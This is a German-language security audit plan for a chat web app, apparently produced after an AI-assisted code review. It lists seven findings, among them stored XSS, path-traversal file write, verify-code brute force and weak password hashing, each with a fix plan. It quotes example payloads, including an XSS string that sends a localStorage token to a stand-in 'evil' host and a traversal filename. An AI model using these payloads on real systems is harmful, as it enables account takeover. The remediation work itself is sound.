# Kneipe Audit-Plan — 2026-04-30 (Welle 2 nach TLS-Implementation)

> Audit gegen `claude-code-security-review` lokal (`local_audit.py`).
> TLS-Architektur ist sauber durchgekommen — Auditor: *"No insecure TLS configuration was identified"*.
> Sieben neue Findings, alle unabhängig von TLS.
> Plus: Zeitstempel-Patzer (Poll-Endpoint crasht bei kaputtem `since=`) bereits gefixt — drei Stellen.

---

## Befunde-Übersicht

| # | Severity | Datei:Zeile | Bereich |
|---|---|---|---|
| 1 | HIGH | `server.py:7505` | Email-Verify-Bypass via 6-stelliger Code Brute-Force |
| 2 | HIGH | `server.py:6172` | Arbitrary File Write via `filename`-Extension in Chat-Upload |
| 3 | HIGH | `index.html:3473` | Stored XSS via `profile_pic` in Member-List innerHTML |
| 4 | HIGH | `index.html:4202` | Stored XSS via `profile_pic` in Profile-Screen innerHTML |
| 5 | HIGH | `index.html:4033` | Stored XSS via `profile_pic` in Participant-List innerHTML |
| 6 | HIGH | `index.html:3517` | Stored XSS via `file_url` in Chat-Image onclick-Handler |
| 7 | MEDIUM | `server.py:2942` | PBKDF2-HMAC-SHA256 nur 100k Iterationen |

**Bonus-Fix bereits drin:** `since`-Validierung in 3 Poll-Endpoints (`/api/chat/poll/`, `/api/tresen/stream`, `/api/durchsage/stream`) — verhindert 502-Crash durch ungültigen Input.

---

## Finding 1 — Email-Verify-Bypass [HIGH]

**Datei:** `server.py:7505` (`handle_verify` GET `/api/verify`)

**Was passiert:**
`handle_verify()` schaut User per `verify_token` aus `?token=...` aus der DB. Aber `verify_token` ist ein 6-stelliger Code (`generate_verify_code = secrets.choice('0123456789') × 6` = 1.000.000 Werte). Anders als `check_verify_code` prüft `handle_verify` **nicht** auf `verify_expires`, der Code lebt also unbegrenzt.

**Risk:**
Angreifer iteriert `GET /api/verify?token=NNNNNN` über 000000–999999. Bei Treffer wird der Account `verified=1` gesetzt — voller Account-Zugriff (unverified Accounts können nicht einloggen, daher = Account-Übernahme).

**Fix-Strategie:**
- `verify_expires` in `handle_verify()` prüfen.
- URL-Link-Verifikation an einen langen Token binden (`secrets.token_hex(16)`).
- 6-stelligen Code nur noch für `(email, code)`-Form-Submit lassen, mit Per-Account-Lockout.

**Aufwand:** ~20 min.

**Status:** offen.

---

## Finding 2 — Arbitrary File Write via Chat-Upload [HIGH]

**Datei:** `server.py:6172` (`handle_chat_file`)

**Was passiert:**
```python
ext = filename.rsplit('.', 1)[-1]  # User-supplied
file_path = os.path.join(VOICE_DIR, f'chat_{file_id}.{ext}')
```
`filename` kommt aus User-JSON, wird nur auf 100 Zeichen gekürzt — keine Zeichen-Validierung. `os.path.join` santisiert keine `/` oder `..` innerhalb einer Komponente, also kann `ext` aus `VOICE_DIR` ausbrechen.

**Risk:**
Authentifizierter User schickt `filename='x./../../badges/pwn.svg'` und beliebigen Base64-Payload. Server schreibt außerhalb `VOICE_DIR` — z.B. ins `badges/`-Verzeichnis (statisch ausgeliefert). Damit: Stored-XSS via SVG, Überschreiben von Static-Assets, beliebiger File-Write wo der Server-Prozess Schreibrechte hat. **Direkter Chain in Finding 6.**

**Fix-Strategie:**
- `ext` strikt validieren mit `re.match(r'^[A-Za-z0-9]{1,8}$', ext)`.
- Final Path verifizieren: `Path(file_path).resolve().is_relative_to(VOICE_DIR.resolve())`.

**Aufwand:** ~10 min.

**Status:** offen.

---

## Finding 3-5 — Stored XSS via `profile_pic` (3 Stellen) [HIGH × 3]

**Dateien:**
- `index.html:3473` — Member-List in `membersEl.innerHTML`
- `index.html:4202` — Profile-Screen in `avatarEl.innerHTML`
- `index.html:4033` — Participant-List in `row.innerHTML`

**Was passiert:**
Alle drei Stellen interpolieren `profile_pic` direkt in `<img src="${profile_pic}">` per innerHTML. Der einzige Check ist `startsWith('data:')` — erlaubt Quote-Breakout.

**Risk:**
Angreifer setzt `profile_pic = 'data:image/png" onerror="fetch(\'//evil/?c=\'+localStorage[\'bar-token\'])'`. Sobald irgendein User die Liste sieht, wird der `bar-token` aus `localStorage` exfiltriert = Account-Takeover.

**Fix-Strategie (für alle drei Stellen identisch):**
- Frontend: existierenden `esc()`-Helper benutzen ODER per `createElement('img')` + `img.src = ...` (kein innerHTML).
- Server: strikte Regex-Validierung beim Speichern: `r'^data:image/(png|jpeg|webp);base64,[A-Za-z0-9+/=]+$'`.
- Beides — Frontend-Escape UND Server-Validation. Defense-in-Depth.

**Aufwand:** ~25 min für alle drei Stellen + Server-Side Validation.

**Status:** offen.

---

## Finding 6 — Stored XSS via Chat `file_url` in onclick [HIGH]

**Datei:** `index.html:3517`

**Was passiert:**
```javascript
contentHtml += `<img src="${m.file_url}" ... onclick="window.open('${m.file_url}','_blank')">`
```
Wird per `div.innerHTML` zugewiesen (~Zeile 3536). Ein einziges Single-Quote in `file_url` bricht aus dem `onclick`-String aus. `file_url` wird server-seitig aus UUID + `ext` gebildet — und via Finding 2 kontrolliert der Angreifer `ext`, damit auch direkt `file_url`.

**Risk:**
Chain mit Finding 2: `filename='x.svg\'),alert(1);//'` ergibt `file_url = '/api/chat-file/abcd1234.svg\'),alert(1);//'`. Beim Anzeigen läuft Angreifer-JS, exfiltriert `bar-token`.

**Fix-Strategie:**
- Event-Handler nicht via String-Concat bauen: `createElement` + `img.addEventListener('click', ...)`.
- Server-Side `ext`-Validation aus Finding 2 ist die andere Hälfte.

**Aufwand:** ~15 min.

**Status:** offen.

---

## Finding 7 — PBKDF2 nur 100k Iterationen [MEDIUM]

**Datei:** `server.py:2942` (`hash_pw` / `verify_pw`)

**Was passiert:**
`hashlib.pbkdf2_hmac('sha256', ..., 100000)`. OWASP 2023+ empfiehlt ≥600k Iterationen für PBKDF2-SHA256, oder Migration auf Argon2id (im File bereits importiert). Mit 8-Zeichen-Mindest-PW = GPU-Cracking machbar wenn `accounts.db` leakt.

**Risk:**
Backup-Diebstahl, File-Disclosure, DB-Exfiltration → großer Anteil der User-Passwörter knackbar in Stunden/Tagen auf einer Commodity-GPU.

**Fix-Strategie:**
- Migration auf Argon2id (`argon2.low_level.hash_secret_raw` schon importiert).
- Mindestens: PBKDF2 auf ≥600k Iterationen, Cost im Hash speichern, Rehash-on-Login wenn Cost zu niedrig.

**Aufwand:** ~45 min wenn Argon2id-Migration mit Rehash-on-Login.

**Status:** offen.

---

## Reihenfolge der Fixes (Vorschlag)

1. **Finding 2** (File-Write) zuerst — chained mit Finding 6, kürzester Fix, erschlägt Angriffsvektor an der Wurzel.
2. **Finding 6** (file_url XSS) direkt danach — DOM-API statt innerHTML.
3. **Findings 3-5** (profile_pic XSS) — drei Stellen identisch, Server-Side Regex zentral.
4. **Finding 1** (Verify-Bypass) — `verify_expires`-Check + Token-Trennung.
5. **Finding 7** (PBKDF2) — Argon2id-Migration mit Rehash-on-Login.

---

## Bereits gefixt heute Abend

- `since`-Validierung in `/api/chat/poll/`, `/api/tresen/stream`, `/api/durchsage/stream` — Try/Except um `float()`, 400 statt 502 bei Quatsch-Input.

---

## Hasi-Entscheidungen die anstehen

- **Finding 7:** Argon2id-Migration JETZT oder vertagen? Mit Rehash-on-Login geht's transparent.
- **Profile-Pic-Server-Validation:** Strikte Regex auf `data:image/(png|jpeg|webp);base64,...` OK? Wer beim Avatar-Upload schon ein anderes Format hat, müsste konvertieren.
- **Reihenfolge OK?** Oder lieber zuerst Verify-Bypass weil größtes Account-Takeover-Risiko?

---

## Konsistenz mit TLS-Architektur

Diese sieben Findings betreffen XSS, File-Path-Validation, Token-Lifecycle, Crypto-Strength — komplett unabhängig von TLS. Die TLS-Schicht ist nach diesem Audit clean: 0 verify-mode-Findings, `_classify_connection` ungeflaggt.

---

*Erstellt: 2026-04-30 von Ray nach lokalem Audit-Lauf via `claude-code-security-review` (Welle 2).*
